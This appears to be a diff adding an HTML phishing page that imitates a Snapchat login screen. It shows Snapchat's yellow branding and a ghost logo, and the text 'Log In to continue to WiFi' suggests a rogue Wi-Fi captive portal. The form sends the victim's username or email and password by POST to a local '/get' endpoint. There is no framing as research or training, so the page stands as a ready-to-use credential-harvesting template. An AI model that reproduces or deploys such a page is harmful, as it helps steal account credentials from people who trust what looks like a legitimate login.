@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Snapchat</title>
+    <style>
+      body {
+        font-family: Avenir Next, -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        background-color: #FFFC00;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 350px;
+        text-align: center;
+      }
+      .logo-container {
+        margin-bottom: 24px;
+      }
+      .g-h1 {
+        font-size: 28px;
+        font-weight: 700;
+        color: #000;
+        margin-bottom: 4px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: #000;
+        margin-bottom: 30px;
+        opacity: 0.8;
+      }
+      .g-input {
+        width: 100%;
+        padding: 16px;
+        border: 2px solid #f1f1f1;
+        border-radius: 24px;
+        font-size: 16px;
+        margin-bottom: 12px;
+        box-sizing: border-box;
+        outline: none;
+        background: #fff;
+        font-family: inherit;
+      }
+      .g-input:focus {
+        border-color: #000;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 16px;
+        background-color: #000;
+        color: #FFFC00;
+        border: none;
+        border-radius: 24px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        margin-top: 8px;
+        font-family: inherit;
+        letter-spacing: 0.5px;
+      }
+      .gbtn-primary:hover {
+        background: #333;
+      }
+      .forgot {
+        display: block;
+        margin-top: 20px;
+        color: #000;
+        font-size: 14px;
+        text-decoration: none;
+        opacity: 0.7;
+      }
+      .forgot:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        margin-top: 20px;
+        font-size: 13px;
+        color: #000;
+        opacity: 0.6;
+      }
+      .footer a {
+        color: #000;
+        text-decoration: none;
+        font-weight: 600;
+        opacity: 1;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="logo-container">
+        <svg viewBox="0 0 100 100" width="80" height="80">
+          <circle cx="50" cy="50" r="50" fill="#fff"/>
+          <path d="M50 15c-15 0-27 10-27 23 0 7 3 13 8 17l-2 8 9-5c3 1 6 1 9 1 1 0 2 0 3 0 0 0 0 0 0 0v1c0 0-1 0-3 0-3 0-6-1-9-1l-9 5 2-8c5-4 8-10 8-17 0-13 12-23 27-23z" fill="#FFFC00" stroke="#000" stroke-width="2"/>
+          <circle cx="40" cy="40" r="4" fill="#000"/>
+          <circle cx="60" cy="40" r="4" fill="#000"/>
+          <path d="M40 55c0 0 4 6 10 6s10-6 10-6" stroke="#000" stroke-width="2" fill="none" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <h1 class="g-h1">Log In</h1>
+      <p class="g-h2">to continue to WiFi</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="text" name="username" placeholder="USERNAME OR EMAIL" required>
+        <input class="g-input" type="password" name="password" placeholder="PASSWORD" required>
+        <button type="submit" class="gbtn-primary">LOG IN</button>
+      </form>
+      <a href="#" class="forgot">Forgot your password?</a>
+      <p class="footer">New to Snapchat? <a href="#">Sign Up</a></p>
+    </div>
+  </body>
+</html>
